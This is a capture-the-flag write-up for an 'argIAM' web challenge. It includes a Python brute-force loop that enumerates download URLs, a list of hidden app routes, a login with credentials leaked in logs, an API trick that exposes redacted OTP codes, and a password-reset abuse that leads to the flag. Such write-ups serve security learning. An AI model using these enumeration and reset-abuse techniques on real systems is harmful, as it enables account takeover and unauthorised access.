First, we bruteforced through /hacker route to find the docs folder.
    (although this could have been found by looking at sources from hacker/insider.)

Then, we noticed that argIAM credential helper was inside parantheses:
>Note: As of 03/02/2024, password resets have been delegated from the IT Team to the corresponding department manager
>due to lay-offs. You may do this with the argIAM Credential Helper (**argIAMCredentialHelper**). This requires your
>physical PIN. Never share this, and keep it on paper!

Then later at the document we also came across this snippet:
>Q: What do I do when an application doesn’t work anymore?

>We keep updating our tools for the very best security compliance.
>Just re-download the tool from **/insider/ops/dl/<name>/v<exe version>.zip**. The password is the year when the company was founded.

We tried multiple versions but through bruteforce, we came across 2 valid zips:

```py
import requests

BASE_URL = "http://olivia.memetrolls.net:2510/insider/ops/dl/argIAMCredentialHelper/v%VERSION%.zip"

for i in range(1000, 10000):
    url = BASE_URL.replace("%VERSION%", ".".join(str(i)))
    print(f"trying version {i}... {url}")
    response = requests.head(url)
    if response.status_code == 200:
        print(f"Found version {i}")
    else:
        print(f"skipping version {i}...")
```

Those being v1.0.0.0 (which had the gato) and v1.0.1.0 (which actually had the tool)

But before finding the credential helper, We checked the logs for insider first. We noticed that the user `monitor@arg.iam` had parantheses next to it, indicating it was some kind of hash.

We then checked the sources for insider to find multiple routes at http://olivia.memetrolls.net:2510/_app/immutable/entry/app.c52c6c1e.js:

```js
de = {
    "/": [4],
    "/(hacker)/hacker": [5],
    "/(hacker)/hacker/admin": [6],
    "/(hacker)/hacker/admin/Enterprise_Applications": [7],
    "/(hacker)/hacker/admin/Enterprise_Applications/xeon": [8, [2]],
    "/(hacker)/hacker/admin/Enterprise_Applications/xeon/login": [9, [2]],
    "/(hacker)/hacker/docs": [10],
    "/(insider)/insider": [11],
    "/(insider)/insider/ops": [12, [3]],
    "/(insider)/insider/ops/bandera": [13, [3]],
    "/(insider)/insider/ops/login": [14, [3]],
    "/(insider)/insider/ops/monitoring": [15, [3]],
    "/(insider)/insider/ops/wechat": [16, [3]]
}
```

After discovering the XeonDB route (hacker/admin/Enterprise_Applications/xeon/login), we successfully logged in by intercepting the /api/ea_xeondb/login route with the credentials from logs:

```
POST /api/ea_xeondb/login HTTP/1.0
Host: olivia.memetrolls.net
Content-Type: application/json
Content-Length: 80

{"username":"monitor@arg.iam","password":"REDACTED"}
```

We then noticed the entry for "qiulin.feng@arg.iam", but the OTP key was redacted. After messing around a while, we noticed that when we updated editted the status, OTP gets revealed when the POST request returns:

```
POST /api/ea_xeondb/entries HTTP/1.1
...

{"id":"0","status":"aa","method":"INSERT"}


HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
content-type: text/plain;charset=UTF-8
Date: Mon, 12 Feb 2024 17:15:37 GMT
Connection: close
Content-Length: 125

{"id":0,"otp":"REDACTED","user":"qiulin.feng@arg.iam","timestamp":0,"sn":0,"status":"aa"}
```

After getting the OTP code, we finally managed to find the credential manager and found out that there was a manager password. To get it: (timing part lazy to rewrite)

>just pure guess
>i just did simple division for Math.power(array.length, array.length)
>which is 5 to the power of 5
>3125
>division until you get perfect number with no decimal
>5x5x5x5x5 fits perfectly

But the app itself doesn't make the request to the correct place, so we had to invoke the URL ourselves by looking at the disassembly.:
http://olivia.memetrolls.net:2510/insider/iamcredhelper/reset?u=qiulin.feng@arg.iam&y=REDACTED&m=55555

After resetting the password, we logged in to the insider panel and logged in to BANDERA. After clicking "Export to XeonDB", we turned back to XeonDB panel to find a new entry.
`{"id":1,"otp":"[REDACTED]","user":"bandera@arg.iam","sn":0,"status":"OK","timestamp":1707756676118}`

Using the same trick as the qiulin.feng@arg.iam OTP key, we finally get the flag:
`{"id":1,"otp":"argIAM{REDACTED}","user":"bandera@arg.iam","sn":0,"status":"OK","timestamp":1707756676118}`